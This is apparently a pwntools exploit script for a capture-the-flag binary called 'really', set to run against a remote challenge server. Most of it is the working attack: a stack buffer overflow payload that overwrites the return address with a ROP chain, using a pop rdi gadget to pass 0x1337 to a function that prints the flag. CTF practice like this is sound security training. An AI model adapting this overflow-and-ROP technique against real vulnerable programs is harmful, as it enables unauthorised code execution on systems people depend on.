from pwn import *
elf = ELF("really")
#libc = ELF("libc.so.6")
context.log_level = "debug"

ip,port = "challs.actf.co", 31225

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()

flag = p64(0x401256)
pop_rdi = p64(0x00000000004013f3)
pop_rsi = p64(0x00000000004013f1)
payload = b"a" + b"bobby" + b"A"*4 + b"aaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa" + pop_rdi + p64(0x1337) + flag

payload1 = b"abobby" + b"a"*66 + pop_rdi + p64(0x1337) + flag
sla("Name: ","aaa")
sla("Address: ",payload1)
r.interactive()